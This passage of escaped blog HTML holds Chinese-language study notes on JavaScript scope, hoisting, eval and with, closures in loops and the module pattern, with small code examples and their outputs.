class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> i=<span class=\"number\">1</span>; i&lt;=<span class=\"number\">5</span>; i++) &#123;</span><br><span class=\"line\">    (<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">var</span> j = i;</span><br><span class=\"line\">        <span class=\"built_in\">setTimeout</span>(<span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">timer</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">            <span class=\"built_in\">console</span>.log( j );</span><br><span class=\"line\">        &#125;, j*<span class=\"number\">1000</span>);</span><br><span class=\"line\">    &#125;)();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> i=<span class=\"number\">1</span>; i&lt;=<span class=\"number\">5</span>; i++) &#123;</span><br><span class=\"line\">    (<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">j</span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"built_in\">setTimeout</span>(<span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">timer</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">            <span class=\"built_in\">console</span>.log( j );</span><br><span class=\"line\">        &#125;, j*<span class=\"number\">1000</span>);</span><br><span class=\"line\">    &#125;)(i);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// outupt ----&gt; 1 2 3 4 5</span></span><br><span class=\"line\"><span class=\"comment\">// 原因：IIFE 会为每个迭代都生成一个新的作用域，都有自己的变量，用 `j` 保存 `i` 的值</span></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> i=<span class=\"number\">1</span>; i&lt;=<span class=\"number\">5</span>; i++) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> j = i; <span class=\"comment\">// 产生了新的块级作用域！</span></span><br><span class=\"line\">    <span class=\"built_in\">setTimeout</span>(<span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">timer</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(j);</span><br><span class=\"line\">    &#125;, j*<span class=\"number\">1000</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i=<span class=\"number\">1</span>; i&lt;=<span class=\"number\">5</span>; i++) &#123;</span><br><span class=\"line\">    <span class=\"built_in\">setTimeout</span>(<span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">timer</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(i);</span><br><span class=\"line\">    &#125;, i*<span class=\"number\">1000</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// outupt ----&gt; 1 2 3 4 5</span></span><br><span class=\"line\"><span class=\"comment\">// 原因：变量 `i` 是 let 声明的，当前的i只在本轮循环有效，所以每一次循环的 `i` 其实都是一个新的变量, </span></span><br><span class=\"line\"><span class=\"comment\">//      JavaScript 引擎内部会记住上一轮循环的值，初始化本轮的变量 `i` 时，就在上一轮循环的基础上进行计算</span></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// for 循环中 let 还有一个特别之处，就是设置循环变量的那部分是一个父作用域，而循环体内部是一个单独的子作用域</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">3</span>; i++) &#123;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> i = <span class=\"string\">&#x27;abc&#x27;</span>;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(i);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// ------ output ------</span></span><br><span class=\"line\"><span class=\"comment\">// abc</span></span><br><span class=\"line\"><span class=\"comment\">// abc</span></span><br><span class=\"line\"><span class=\"comment\">// abc</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"10、闭包与模块\"><a href=\"#10、闭包与模块\" class=\"headerlink\" title=\"10、闭包与模块\"></a>10、闭包与模块</h3><p>模块：返回的对象中含有对内部函数而不是内部数据变量的引用，保持内部数据变量是隐藏且私有的状态，并提供公共的API</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 模块模式</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">foo</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> something = <span class=\"string\">&quot;cool&quot;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> another = [<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>];</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">doSomething</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(something);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">doAnother</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(another.join( <span class=\"string\">&quot; ! &quot;</span> ));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> &#123;</span><br><span class=\"line\">        doSomething,</span><br><span class=\"line\">        doAnother</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>模块模式的两个必要条件：</p>\n<ol>\n<li>必须有外部的封闭函数，该函数必须至少被调用一次（每次调用都会创建一个新的模块实例）。</li>\n<li>封闭函数必须返回至少一个内部函数，这样内部函数才能在私有作用域中形成闭包，并且可以访问或者修改私有的状态。</li>\n</ol>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"作用域与闭包\"><a href=\"#作用域与闭包\" class=\"headerlink\" title=\"作用域与闭包\"></a>作用域与闭包</h1><h3 id=\"1、JavaScript-编译\"><a href=\"#1、JavaScript-编译\" class=\"headerlink\" title=\"1、JavaScript 编译\"></a>1、JavaScript 编译</h3><p>源代码在执行之前会进行编译，分为三个步骤：</p>\n<ol>\n<li>分词/词法分析：将由字符组成的字符串分解成有意义的代码块，这些代码块被称为词法单元</li>\n<li>解析/语法分析：将词法单元流（数组）转换成一个由元素逐级嵌套所组成的代表了程序语法结构的树。这个树被称为“抽象语法树”（Abstract Syntax Tree，AST）</li>\n<li>代码生成：将 AST 转换为可执行代码（一组机器指令）</li>\n</ol>\n<blockquote>\n<p>JavaScript引擎要复杂些，在语法分析和代码生成阶段有特定的步骤来对运行性能进行优化，包括对冗余元素进行优化等。</p>\n</blockquote>\n<ul>\n<li>引擎：从头到尾负责整个 JavaScript 程序的编译及执行过程。</li>\n<li>编译器：负责语法分析及代码生成等脏活累活（详见前一节的内容）。</li>\n<li>作用域：负责收集并维护由所有声明的标识符（变量）组成的一系列查询，并实施一套非常严格的规则，确定当前执行的代码对这些标识符的访问权限。</li>\n</ul>\n<blockquote>\n<p>以变量赋值为例，首先编译器会在当前作用域中声明一个变量（如果之前没有声明过），然后在运行时引擎会在作用域中查找该变量，如果能够找到就会对它赋值。</p>\n</blockquote>\n<h3 id=\"2-作用域\"><a href=\"#2-作用域\" class=\"headerlink\" title=\"2. 作用域\"></a>2. 作用域</h3><p>作用域：是一套规则，用于确定在何处以及如何查找变量（标识符）</p>\n<p>当一个块或函数嵌套在另一个块或函数中时，就发生了作用域嵌套。因此，在当前作用域中无法找到某个变量时，引擎就会在外层嵌套的作用域中继续查找，直到找到该变量，或抵达最外层的作用域（也就是全局作用域）为止。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 气泡1 （全局环境）</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">foo</span> (<span class=\"params\">a</span>) </span>&#123; <span class=\"comment\">// 气泡2</span></span><br><span class=\"line\">    <span class=\"keyword\">var</span> b = a * <span class=\"number\">2</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">bar</span> (<span class=\"params\">c</span>) </span>&#123; <span class=\"comment\">// 气泡3</span></span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(a, b, c);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">foo(<span class=\"number\">2</span>);</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>气泡1包含着整个全局作用域，其中只有一个标识符： foo 。</li>\n<li>气泡2包含着 foo 所创建的作用域，其中有三个标识符： a 、 bar 和 b 。</li>\n<li>气泡3包含着 bar 所创建的作用域，其中只有一个标识符： c 。</li>\n</ul>\n<p>作用域有两种工作模型：词法作用域、动态作用域</p>\n<blockquote>\n<p>词法作用域是在定义时确定的，关注函数在何处声明<br>动态作用域是在运行时确定的，关注函数从何处调用，其作用域链是基于运行时的调用栈的。</p>\n</blockquote>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> a = <span class=\"number\">2</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">foo</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(a);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">bar</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> a = <span class=\"number\">3</span>;</span><br><span class=\"line\">  foo();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">bar();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 如果js是词法作用域（就是），那么应该会输出 2</span></span><br><span class=\"line\"><span class=\"comment\">// 如果js是动态作用域，那么应该会输出 3</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3、词法作用域\"><a href=\"#3、词法作用域\" class=\"headerlink\" title=\"3、词法作用域\"></a>3、词法作用域</h3><p>在 JavaScript 中采用词法作用域，即代码在编写过程中体现出来的作用范围，代码一旦写好，不用执行，作用范围就已经确定好了（大部分情况如此，this、with、eval除外）， 这就是所谓的词法作用域。</p>\n<p>作用域查找始终从运行时所处的最内部作用域开始，逐级向外或者说向上进行，直到遇见第一个匹配的标识符为止。</p>\n<p>在多层的嵌套作用域中可以定义同名的标识符，这叫作<strong>遮蔽效应</strong>（内部的标识符遮蔽了外部的标识符）</p>\n<blockquote>\n<p>全局变量会自动成为全局对象（比如浏览器中的 window 对象）的属性，因此可以不直接通过全局对象的词法名称，而是间接地通过对全局对象属性的引用来对其进行访问。</p>\n</blockquote>\n<p>在 JavaScript 中词法作用域规则:</p>\n<ul>\n<li>函数允许访问函数外的数据</li>\n<li>整个代码结构中只有函数可以限定作用域（ES6 新增块级作用域）</li>\n<li>作用规则首先使用提升规则分析</li>\n<li>通过作用域链进行查找，如果当前作用规则作用域中已查找到，则不再往父作用域查找</li>\n</ul>\n<h3 id=\"4、词法欺骗\"><a href=\"#4、词法欺骗\" class=\"headerlink\" title=\"4、词法欺骗\"></a>4、词法欺骗</h3><h5 id=\"4-1-eval\"><a href=\"#4-1-eval\" class=\"headerlink\" title=\"4.1 eval\"></a>4.1 eval</h5><p>JavaScript 中的 <code>eval()</code> 函数可以接受一个字符串为参数，并将其中的内容视为好像在书写时就存在于程序中这个位置的代码。<code>eval()</code> 在运行期修改了书写期的词法作用域。</p>\n<p>换句话说，可以在你写的代码中用程序生成代码并运行，就好像代码是写在那个位置的一样。<code>eval()</code> 通过代码欺骗和假装成书写时（也就是词法期），来实现修改词法作用域环境的。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">foo</span>(<span class=\"params\">str, a</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">eval</span>( str ); <span class=\"comment\">// 欺骗！</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log( a, b );</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">var</span> b = <span class=\"number\">2</span>;</span><br><span class=\"line\">foo( <span class=\"string\">&quot;var b = 3;&quot;</span>, <span class=\"number\">1</span> ); <span class=\"comment\">// 1, 3</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 码实际上在 foo(..) 内部创建了一个变量 b ，并遮蔽了外部（全局）作用域中的同名变量</span></span><br></pre></td></tr></table></figure>\n\n<h5 id=\"4-2-with\"><a href=\"#4-2-with\" class=\"headerlink\" title=\"4.2 with\"></a>4.2 with</h5><p>with 通常被当作重复引用同一个对象中的多个属性的快捷方式，可以不需要重复引用对象本身。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">foo</span>(<span class=\"params\">obj</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">with</span> (obj) &#123;</span><br><span class=\"line\">        a = <span class=\"number\">2</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">var</span> o1 = &#123; <span class=\"attr\">a</span>: <span class=\"number\">3</span> &#125;;</span><br><span class=\"line\"><span class=\"keyword\">var</span> o2 = &#123; <span class=\"attr\">b</span>: <span class=\"number\">3</span> &#125;;</span><br><span class=\"line\">foo( o1 );</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log( o1.a ); <span class=\"comment\">// 2</span></span><br><span class=\"line\">foo( o2 );</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log( o2.a ); <span class=\"comment\">// undefined</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log( a );    <span class=\"comment\">// 2——不好，a 被泄漏到全局作用域上了！</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// o2 的作用域、 foo(..) 的作用域和全局作用域中都没有找到标识符 a ，因此当 a＝2 执行时，</span></span><br><span class=\"line\"><span class=\"comment\">// 自动创建了一个全局变量（因为是非严格模式）。</span></span><br></pre></td></tr></table></figure>\n\n<p><strong>总结：</strong></p>\n<ul>\n<li>eval() 函数如果接受了含有一个或多个声明的代码，就会修改其所处的词法作用域。</li>\n<li>with 声明实际上是根据传递给它的对象凭空创建了一个全新的词法作用域。   </li>\n<li>严格模式下，eval() 和 with 功能受限制</li>\n<li>如果出现了 eval() 或 with ，所有的优化可能都是无意义的，因此最简单的做法就是完全不做任何优化。</li>\n</ul>\n<h3 id=\"5、函数作用域\"><a href=\"#5、函数作用域\" class=\"headerlink\" title=\"5、函数作用域\"></a>5、函数作用域</h3><p>函数作用域：指属于这个函数的全部变量都可以在整个函数的范围内使用及复用（包括嵌套的作用域）。</p>\n<p>立即执行函数表达式：（Immediately Invoked Function Expression）</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> a = <span class=\"number\">2</span>;</span><br><span class=\"line\">(<span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">IIFE</span>(<span class=\"params\"><span class=\"built_in\">global</span>, <span class=\"literal\">undefined</span></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> a = <span class=\"number\">3</span>;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log( a ); <span class=\"comment\">// 3</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log( <span class=\"built_in\">global</span>.a ); <span class=\"comment\">// 2</span></span><br><span class=\"line\">&#125;)(<span class=\"built_in\">window</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log( a ); <span class=\"comment\">// 2</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 将 window 对象的引用传递进去，使得对全局对象的引用变得比引用一个没有“全局”字样的变量更加清晰</span></span><br><span class=\"line\"><span class=\"comment\">// 解决 undefined 标识符的默认值被错误覆盖导致的异常</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"6、块作用域\"><a href=\"#6、块作用域\" class=\"headerlink\" title=\"6、块作用域\"></a>6、块作用域</h3><p>块作用域：指变量和函数属于所处的作用域在某个代码块中（通常指 { .. } 内部）</p>\n<blockquote>\n<p>let 为其声明的变量隐式地创建了块级作用域<br>使用块作用域更加主流，也便于开发、维护</p>\n</blockquote>\n<h3 id=\"7、变量提升\"><a href=\"#7、变量提升\" class=\"headerlink\" title=\"7、变量提升\"></a>7、变量提升</h3><p>提升：无论作用域中的声明出现在什么地方，都将在代码本身被执行前首先进行处理。可以将这个过程形象地想象成所有的声明（变量和函数）都会被“移动”到各自作用域的最顶端。</p>\n<ul>\n<li>只有声明本身会被提升，而赋值或其他运行逻辑会留在原地</li>\n<li>函数声明会被提升，但是函数表达式却不会被提升</li>\n<li>函数声明和变量声明都会被提升。但函数会首先被提升，然后才是变量</li>\n<li>在每个作用域中都会被提升，包括全局作用域、函数作用域、块级作用域</li>\n</ul>\n<p>以 <code>var a = 2; </code>为例，JavaScript 会看做两部分 <code>var a;</code> 和 <code>a = 2;</code>，第一个定义声明是在编译阶段进行的，第二个赋值声明会被留在原地等待执行阶段。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 变量声明会被提升</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">foo</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> a;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log( a ); <span class=\"comment\">// undefined</span></span><br><span class=\"line\">    a = <span class=\"number\">2</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">foo();</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 函数表达式不会被提升</span></span><br><span class=\"line\">foo(); <span class=\"comment\">// 不是 ReferenceError, 而是 TypeError!</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> foo = <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">bar</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"number\">12312</span>);</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">foo(); <span class=\"comment\">// 1</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> foo;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">foo</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log( <span class=\"number\">1</span> );</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">foo = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log( <span class=\"number\">2</span> );</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// ----- output -------</span></span><br><span class=\"line\"><span class=\"comment\">// 输出：1</span></span><br><span class=\"line\"><span class=\"comment\">// ----- javascript 理解成如下形式 -----</span></span><br><span class=\"line\"><span class=\"comment\">// function foo() &#123;</span></span><br><span class=\"line\"><span class=\"comment\">//      console.log( 1 );</span></span><br><span class=\"line\"><span class=\"comment\">// &#125;</span></span><br><span class=\"line\"><span class=\"comment\">// foo(); // 1</span></span><br><span class=\"line\"><span class=\"comment\">// foo = function() &#123;</span></span><br><span class=\"line\"><span class=\"comment\">//      console.log( 2 );</span></span><br><span class=\"line\"><span class=\"comment\">// &#125;; </span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"8、闭包\"><a href=\"#8、闭包\" class=\"headerlink\" title=\"8、闭包\"></a>8、闭包</h3><p>概念：当函数可以记住并访问所在的词法作用域时，就产生了闭包，即使函数是在当前词法作用域之外执行。</p>\n<p>作用：</p>\n<ol>\n<li>变量和对象的私有化</li>\n<li>数据缓存</li>\n<li>模块化</li>\n</ol>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">wait</span>(<span class=\"params\">message</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">setTimeout</span>(<span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">timer</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(message);</span><br><span class=\"line\">    &#125;, <span class=\"number\">1000</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">wait( <span class=\"string\">&quot;Hello, closure!&quot;</span> );</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 将一个内部函数（名为 timer ）传递给 setTimeout(..) 。</span></span><br><span class=\"line\"><span class=\"comment\">// timer 具有涵盖 wait(..) 作用域的闭包，因此还保有对变量 message 的引用。</span></span><br><span class=\"line\"><span class=\"comment\">// wait(..) 执行 1000 毫秒后，它的内部作用域并不会消失， timer 函数依然保有 wait(..) 作用域的闭包</span></span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>在定时器、事件监听器、Ajax 请求、跨窗口通信、Web Workers 或者任何其他的异步（或者同步）任务中，只要使用了回调函数，实际上就是在使用闭包</p>\n</blockquote>\n<h3 id=\"9、闭包与循环\"><a href=\"#9、闭包与循环\" class=\"headerlink\" title=\"9、闭包与循环\"></a>9、闭包与循环</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> i=<span class=\"number\">1</span>; i&lt;=<span class=\"number\">5</span>; i++) &#123;</span><br><span class=\"line\">    <span class=\"built_in\">setTimeout</span>(<span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">timer</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(i);</span><br><span class=\"line\">    &#125;, i*<span class=\"number\">1000</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// outupt ----&gt; 6 6 6 6 6</span></span><br><span class=\"line\"><span class=\"comment\">// 原因：所有的 `i` 被封闭在一个共享的全局作用域中，因此实际上只有一个 `i`</span></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> i=<span class=\"number\">1</span>; i&lt;=<span class=\"number\">5</span>; i++) &#123;</span><br><span class=\"line\">    (<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"built_in\">setTimeout</span>(<span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">timer</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">            <span class=\"built_in\">console</span>.log( i );</span><br><span class=\"line\">        &#125;, i*<span class=\"number\">1000</span>);</span><br><span class=\"line\">    &#125;)();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// outupt ----&gt; 6 6 6 6 6</span></span><br><span class=\"line\"><span class=\"comment\">// 原因：每个函数都是一个作用域，但这个作用域是空的，当查询 `i` 时，依然会从父作用域中查找，实际上是一个 `i`</span></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span 